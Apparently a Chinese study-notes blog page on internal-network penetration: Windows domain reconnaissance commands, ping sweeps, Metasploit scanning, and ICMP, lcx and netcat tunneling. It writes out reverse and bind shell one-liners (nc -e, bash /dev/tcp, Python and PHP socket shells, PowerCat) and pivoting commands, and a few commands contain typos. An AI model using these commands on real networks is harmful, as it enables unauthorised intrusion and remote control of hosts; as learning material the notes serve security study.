<h4 id="本机共享列表和可访问的域共享列表">本机共享列表和可访问的域共享列表</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net share<br><span class="hljs-meta">#</span><span class="bash"> wmic</span><br>wmic shear get name,path,status<br></code></pre></td></tr></table></figure>
<h4 id="查看路由表以及arp缓存表">查看路由表以及arp缓存表</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>route print<br>arp -a<br></code></pre></td></tr></table></figure>
<h4 id="自动收集信息">自动收集信息</h4>
<p>知道 Wmic、Empire工具名字即可</p>
<h2 id="2-3">2.3</h2>
<h3 id="查询当前权限">查询当前权限</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>whoami<br></code></pre></td></tr></table></figure>
<h4 id="三种不同的权限">三种不同的权限</h4>
<ol>
<li>本地普通用户，如：<code>win-2008\user</code></li>
<li>本地管理员用户，如：<code>win7-x64\administrator</code></li>
<li>域内用户，如：<code>hacker\administrator</code>，其表示在域<code>hacker</code>内的管理员账户</li>
</ol>
<h3 id="SID">SID</h3>
<p>SID的全称是安全标识符（Security Identify），是为域或本地计算机中创建的<strong>每个帐户</strong>分配的<strong>唯一ID字符串</strong></p>
<h4 id="SID获取">SID获取</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>whoami /all<br></code></pre></td></tr></table></figure>
<h3 id="指定用户详细信息（需要在域环境执行）">指定用户详细信息（需要在域环境执行）</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net user XXX /domain # XXX 指对应用户名<br></code></pre></td></tr></table></figure>
<h2 id="2-4">2.4</h2>
<h3 id="判断是否存在域">判断是否存在域</h3>
<h4 id="使用ipconfig">使用ipconfig</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>ipconfig /all<br></code></pre></td></tr></table></figure>
<h4 id="查看系统详细信息">查看系统详细信息</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>systeminfo<br></code></pre></td></tr></table></figure>
<h4 id="查询当前登录域以登录用户信息">查询当前登录域以登录用户信息</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net config workstation<br></code></pre></td></tr></table></figure>
<h4 id="判断主域">判断主域</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net time /domain<br></code></pre></td></tr></table></figure>
<blockquote>
<p>判断方式:</p>
<ul>
<li>存在域，但当前不是域用户：发生系统错误 5</li>
<li>存在域，且当前用户是域用户：显示时间</li>
<li>当前为工作组，不存在域：找不到域控</li>
</ul>
</blockquote>
<h2 id="2-5">2.5</h2>
<h3 id="探测域内存活主机">探测域内存活主机</h3>
<h4 id="NetBIOS探测">NetBIOS探测</h4>
<p>NetBIOS是局域网程序使用的一种API，几乎所有的局域网都是在NetBIOS协议的基础上工作的。</p>
<p>NetBIOS也是计算机的标识名，主要用于局域网中计算机的互访。</p>
<p>NetBIOS的工作流程就是正常的机器名解析査询应答过程</p>
<p>对应工具：<code>nbtscan</code></p>
<h4 id="ICMP协议探测">ICMP协议探测</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;<br></code></pre></td></tr></table></figure>
<p>需要看懂上面命令</p>
<blockquote>
<p>for /L %I in (1,1,254) do 构造了一段循环，/L指循环（loop）</p>
<p>前半段为固定的格式，类似于C中的for(i=1;i&lt;=254;i=i+1)</p>
<p>DO后面跟着的是执行的语句</p>
<p>-w 1 是超时时间设置为1ms</p>
<p>-n 1 是只发送一个包</p>
<p>目的ip的最后8位被循环变量代替</p>
<p>最后通过管道将结果利用findstr命令过滤，只显示通的IP</p>
<p>@ 用于隐藏ping命令自身的回显</p>
</blockquote>
<h3 id="VBS脚本运行">VBS脚本运行</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cscript Example.vbs<br></code></pre></td></tr></table></figure>
<h2 id="2-6">2.6</h2>
<h3 id="扫描域内端口">扫描域内端口</h3>
<h4 id="telnet">telnet</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>telnet &lt;域控计算机名&gt; &lt;探测端口&gt;<br></code></pre></td></tr></table></figure>
<p>可以快速的探测某个主机的常规的高危端口是否开放</p>
<h4 id="Metasploit">Metasploit</h4>
<p>启动：<code>msfconsole</code></p>
<p>使用指定模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs metasploit">use &lt;模块名&gt; 如use auxiliary/scanner/portscan/tcp <br></code></pre></td></tr></table></figure>
<p>显示设置：<code>show options</code></p>
<p>设置端口：<code>set port &lt;端口号范围&gt;</code></p>
<p>设置远程目的IP：<code>set rhosts</code></p>
<p>设置线程数：<code>set threads &lt;线程数量&gt;</code></p>
<p>运行：<code>run</code></p>
<h3 id="端口bannner信息">端口bannner信息</h3>
<p><img src="https://s2.loli.net/2024/06/10/xi487rs6OjFNptq.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="https://s2.loli.net/2024/06/10/KW6v7siqhYJRmt4.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="https://s2.loli.net/2024/06/10/uPDSGe6A54YzgE9.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="https://s2.loli.net/2024/06/10/xDeqAiIksLmt5cJ.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h2 id="2-7">2.7</h2>
<h3 id="收集域内基础信息">收集域内基础信息</h3>
<h4 id="查询域">查询域</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net view /domain<br></code></pre></td></tr></table></figure>
<h4 id="查询域内所有计算机">查询域内所有计算机</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net view /domain:&lt;域名&gt;<br></code></pre></td></tr></table></figure>
<h4 id="查询域内所有用户组列表">查询域内所有用户组列表</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net group /domain<br></code></pre></td></tr></table></figure>
<h4 id="查询所有域成员计算机列表">查询所有域成员计算机列表</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net group &quot;Domain Computers&quot; /domain<br></code></pre></td></tr></table></figure>
<h4 id="获取域密码信息">获取域密码信息</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net accounts /domain<br></code></pre></td></tr></table></figure>
<h4 id="获取域信任信息">获取域信任信息</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>nltest /domain_trusts<br></code></pre></td></tr></table></figure>
<h2 id="2-8">2.8</h2>
<h4 id="查看域控制器机器名">查看域控制器机器名</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>nltest /DCLIST:&lt;域名&gt; netdome query pdc<br></code></pre></td></tr></table></figure>
<h4 id="查看域控制器主机名">查看域控制器主机名</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>nslookup -type=SRV_ldap._tcp<br></code></pre></td></tr></table></figure>
<h4 id="查看当前时间">查看当前时间</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net time /domain<br></code></pre></td></tr></table></figure>
<h4 id="查看域控制器组">查看域控制器组</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net group &quot;Domain Controllers&quot; /domain<br></code></pre></td></tr></table></figure>
<h2 id="2-9">2.9</h2>
<h4 id="查询域管理员用户">查询域管理员用户</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net group &quot;domain admins&quot; /domain <br></code></pre></td></tr></table></figure>
<h4 id="查询管理员用户组">查询管理员用户组</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net group &quot;Enterprise Admins&quot; /domain<br></code></pre></td></tr></table></figure>
<h2 id="2-10">2.10</h2>
<h3 id="定位域管理员（知道工具即可）">定位域管理员（知道工具即可）</h3>
<p>psloggedon.exe、PVEFindADUser.exe、NetVie、Nmap的NSE脚本（如何使用）</p>
<blockquote>
<p>namp nse脚本使用：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>nmap -script 脚本名称 目标<br></code></pre></td></tr></table></figure>
<p>此处使用的为：<code>smb-enum-sessions.nse</code>来获取远程机器的登录会话，<code>smb-os-discovery.nse</code>获取目标主机信息</p>
<p>后续的信息收集使用：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">smb-<span class="hljs-keyword">enum</span>-&lt;收集信息&gt;.nse<br></code></pre></td></tr></table></figure>
<p>收集信息选项包括：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">domains</span><span class="hljs-params">(域控主机)</span></span><br><span class="hljs-function"><span class="hljs-title">users</span><span class="hljs-params">(域用户信息)</span></span> <br><span class="hljs-function"><span class="hljs-title">shares</span><span class="hljs-params">(共享目录)</span></span> <br><span class="hljs-function"><span class="hljs-title">processes</span><span class="hljs-params">(系统进程，运行软件)</span></span> <br><span class="hljs-function"><span class="hljs-title">sessions</span><span class="hljs-params">(登录会话，登录状态)</span></span> <br></code></pre></td></tr></table></figure>
</blockquote>
<h2 id="2-11">2.11</h2>
<h3 id="查找域管理进程">查找域管理进程</h3>
<h4 id="获取域管理员列表">获取域管理员列表</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net group &quot;Domain Admins&quot; /domaim<br></code></pre></td></tr></table></figure>
<h4 id="列出本机所有进程以及进程用户">列出本机所有进程以及进程用户</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>tasklist /v<br></code></pre></td></tr></table></figure>
<h1>第三章</h1>
<h2 id="3-1">3.1</h2>
<h3 id="隐藏通信隧道基础">隐藏通信隧道基础</h3>
<h4 id="常用隧道">常用隧道</h4>
<p>网络层：IPv6隧道、ICMP隧道、GRE隧道</p>
<p>传输层：TCP隧道、UDP隧道、常规端口转发</p>
<p>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</p>
<h3 id="常用工具">常用工具</h3>
<h4 id="ICMP协议">ICMP协议</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>ping &lt;IP地址或域名&gt;<br></code></pre></td></tr></table></figure>
<h4 id="TCP协议">TCP协议</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>nc &lt;IP地址 端口号&gt;<br></code></pre></td></tr></table></figure>
<h4 id="HTTP协议">HTTP协议</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell on Windows</span><br>curl &lt;target url/IP:Port&gt;<br><span class="hljs-meta">#</span><span class="bash"> bash on Linux</span><br>wget &lt;target url/IP:Port&gt;<br></code></pre></td></tr></table></figure>
<h4 id="DNS协议">DNS协议</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>nslookup &lt;target url/IP:Port&gt; &lt;DNS Server IP&gt; # run on Windows<br>dig @&lt;DNS Server IP&gt; &lt;target url/IP:Port&gt; # run on Linux<br><span class="hljs-meta">#</span><span class="bash"> Examples</span><br>nslookup www.baidu.com vps-ip<br>dig @vps-ip www.baidu.com<br></code></pre></td></tr></table></figure>
<h2 id="3-2">3.2</h2>
<h3 id="IPv6隧道（了解）">IPv6隧道（了解）</h3>
<p>通过 Ipv4 传递 Ipv6 数据包，可以绕开一些防火墙</p>
<h3 id="ICMP隧道">ICMP隧道</h3>
<h4 id="PingTunnel">PingTunnel</h4>
<p>PingTunnel基本特点：属于网络层，可以设置密码</p>
<h5 id="设置密码">设置密码</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>ptunnel -x &lt;Password&gt;<br></code></pre></td></tr></table></figure>
<h5 id="VPS内设置隧道">VPS内设置隧道</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>ptunnel -p &lt;另外一端的ptunnel服务器IP地址（即代理服务器IP）&gt; -lp &lt;本机监听端口&gt; -da &lt;靶机地址&gt; -dp &lt;靶机端口&gt;<br></code></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/06/11/ILBwpFyMZnDfl5T.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>以上图为例(VPS IP:192.168.1.10)：<code>ptunnel -p 192.168.1.4 -lp 1080 -da 1.1.1.10 -dp 3389</code></p>
<blockquote>
<p>常见参数：</p>
<p>-x：指定ICMP隧道连接的验证密码</p>
<p>-lp：指定要监听的本地TCP端口</p>
<p>-da：指定要转发的目标机器的IP地址</p>
<p>-dp：指定要转发的目标机器的TCP端口</p>
<p>-p：指定ICMP隧道另一端的机器的IP地址</p>
</blockquote>
<p>上述命令的含义是：在访问攻击者VPS(<code>192.168.1.10</code>)的1080端口时，会把数据库服务器<code>1.1.1.10</code>的3389端口的数据封装在ICMP隧道里，以 Web服务器<code>192.168.1.4</code>为ICMP隧道跳板进行传送。</p>
<h5 id="防范方法">防范方法</h5>
<ul>
<li>检测同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用ICMP 隧道的浏览器会在很短的时间内产生上千个ICMP数据包</li>
<li>注意那些Payload大于64bit的ICMP数据包</li>
<li>寻找响应数据包中的Payload与请求数据包中的Payload不一致的ICMP数据包</li>
<li>检查ICMP数据包的协议标签。例如，icmptunnel会在所有的ICMP Payload前面添加<code>TUNL</code>标记 来标识隧道</li>
</ul>
<h2 id="3-3">3.3</h2>
<h3 id="传输层隧道">传输层隧道</h3>
<p>传输层技术包括TCP隧道、UDP隧道和常规端口转发等</p>
<h4 id="lcx端口转发">lcx端口转发</h4>
<h5 id="内网端口转发">内网端口转发</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>lcx.exe -slave  &lt;VPS IP&gt; &lt;VPS 端口&gt; 127.0.0.1 &lt;本机转发端口&gt;	# 目标机器上执行<br>lcx.exe -listen &lt;VPS 端口 1&gt; &lt;VPS 端口 2&gt;	# VPS上运行<br></code></pre></td></tr></table></figure>
<p>转发完成后可以通过访问VPS的端口2来访问目标机器所转发的端口</p>
<h5 id="本地端口映射">本地端口映射</h5>
<p>如果目标服务器因为防火墙的限制，部分端口无法通过防火墙，则可以在目标主机上将对应端口数据通过其他防火墙允许的端口进行传递</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>lcx -trans &lt;允许通过的端口&gt; &lt;不允许通过的端口&gt;		# 目标机器上运行 <br></code></pre></td></tr></table></figure>
<h4 id="netcat">netcat</h4>
<blockquote>
<p>常用参数：</p>
<p>-l    用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。<br>
-p    设置通信端口<br>
-s    指定发送数据的源IP地址，适用于多网卡机<br>
-u    指定nc使用UDP协议，默认为TCP<br>
-v    输出交互或出错信息，新手调试时尤为有用 （-vv 获取更详细的输出信息）<br>
-w    超时秒数，后面跟数字<br>
-n    直接使用IP地址（不通过域名服务器)</p>
</blockquote>
<h5 id="banner抓取">banner抓取</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>nc -nv &lt;靶机ip&gt; &lt;靶机端口&gt;<br></code></pre></td></tr></table></figure>
<h5 id="链接远程主机">链接远程主机</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>nc -nvv &lt;靶机ip&gt; &lt;靶机端口&gt;<br></code></pre></td></tr></table></figure>
<h5 id="端口扫描">端口扫描</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>nc -v &lt;靶机ip&gt; &lt;靶机端口&gt;<br>nc -v -z &lt;靶机ip&gt; &lt;端口范围&gt;  # 用于批量扫描（扫描速度很慢）<br></code></pre></td></tr></table></figure>
<h5 id="端口监听">端口监听</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>nc -l -p &lt;本地端口&gt;<br></code></pre></td></tr></table></figure>
<h5 id="文件传输">文件传输</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>nc -vn &lt;目的IP&gt; &lt;目的端口&gt; &lt; &lt;文件名&gt; -q -1  # 用于发送文件<br>nc -l -p &lt;本地端口&gt; &gt; &lt;文件名&gt;  # 用于将接收的信息保存到文件中<br></code></pre></td></tr></table></figure>
<h5 id="简易聊天">简易聊天</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>nc -l -p &lt;本地端口&gt; 	# 本地主机运行<br>nc -vn &lt;目的IP&gt; &lt;目的端口&gt;	# 远程主机运行<br></code></pre></td></tr></table></figure>
<h5 id="Shell获取-正向">Shell获取-正向</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br><span class="hljs-meta">#</span><span class="bash"> 攻击机</span><br>nc -lvp &lt;端口&gt; -e /bin/bash  # run on Linux<br>nc -lvp &lt;端口&gt; -e C:\Windows\System32\cmd.exe		# run on Windows<br><span class="hljs-meta">#</span><span class="bash"> 靶机</span><br>nc &lt;攻击机IP&gt; &lt;攻击机端口&gt;<br></code></pre></td></tr></table></figure>
<h5 id="Shell获取-反向">Shell获取-反向</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br><span class="hljs-meta">#</span><span class="bash"> 攻击机</span><br>nc -lvp &lt;端口&gt; <br><span class="hljs-meta">#</span><span class="bash"> 靶机</span><br>nc &lt;攻击机IP&gt; &lt;攻击机端口&gt; -e C:\Windows\System32\cmd.exe	# run on Windows<br>nc &lt;攻击机IP&gt; &lt;攻击机端口&gt; -e /bin/bash		# run on Linux<br></code></pre></td></tr></table></figure>
<h4 id="无nc时反向shell">无nc时反向shell</h4>
<h5 id="python反向shell">python反向shell</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>python -c &#x27;import socket, subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.4&quot;,2222)) ; os.dup2(s.fileno() ,0);os.dup2(s.fileno(),1); os.dup2(s.fileno( ),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;<br></code></pre></td></tr></table></figure>
<h5 id="bash反向shell">bash反向shell</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br><span class="hljs-meta">#</span><span class="bash"> 攻击机</span><br>nc —lvp &lt;某个端口&gt;<br><span class="hljs-meta">#</span><span class="bash"> 靶机</span><br>bash -i &gt;&amp; /dev/tcp/&lt;攻击机IP&gt;/&lt;攻击机端口&gt; 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
<h5 id="php反向shell">php反向shell</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br><span class="hljs-meta">#</span><span class="bash"> 攻击机</span><br>nc —lvp &lt;某个端口&gt;<br><span class="hljs-meta">#</span><span class="bash"> 靶机</span><br>php -r &#x27;$sock=fsockopen(&quot;&lt;攻击机ip&gt;&quot;,&lt;攻击机端口&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;<br></code></pre></td></tr></table></figure>
<h4 id="内网代理">内网代理</h4>
<p><img src="https://s2.loli.net/2024/06/11/sDeT8OEq1biXhnC.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>有如上拓扑图时想要VPS能够访问对应的数据库服务器，则需要通过web服务器进行代理</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> bash</span><br><span class="hljs-meta">#</span><span class="bash"> run on VPS</span><br>nc -lvp 3333<br><span class="hljs-meta">#</span><span class="bash"> run on SQL Server(Linux)</span><br>nc -lvp 3333 -e /bin/bash<br><span class="hljs-meta">#</span><span class="bash"> run on Web Server(Linux)</span><br>nc -v 192.168.1.4 3333 -c &quot;nc -v 1.1.1.200 3333&quot;<br></code></pre></td></tr></table></figure>
<h4 id="PowerCat">PowerCat</h4>
<p>nc的PowerShell版本</p>
<h5 id="正向shell获取">正向shell获取</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br><span class="hljs-meta">#</span><span class="bash"> 攻击机</span><br>nc 192.168.99.27 8080 -vv # 受害机IP：192.168.99.27<br><span class="hljs-meta">#</span><span class="bash"> 受害机</span><br>powercat -l -p 8080 -e cmd.exe -v<br></code></pre></td></tr></table></figure>
<h5 id="反向shell获取">反向shell获取</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br><span class="hljs-meta">#</span><span class="bash"> 攻击机</span><br>nc -l -p 8080 -vv<br><span class="hljs-meta">#</span><span class="bash"> 受害机</span><br>powercat -c 192.168.99.18 -p 8080 -v -e cmd.exe 	# 攻击机IP：192.168.99.18<br></code></pre></td></tr></table></figure>
<h2 id="3-4">3.4</h2>
<h3 id="应用层隧道">应用层隧道</h3>
<h4 id="SSH协议">SSH协议</h4>
<p>SSH为建⽴在应⽤层基础上的安全协议。SSH是较可靠，专为远程登录会话和其他⽹络服务提供安全性的协议</p>
<h5 id="本地转发">本地转发</h5>
<p>将靶机端口数据转发到vps对应的端口上，之后可以通过访问vps的对应端口以访问靶机的对应端口</p>
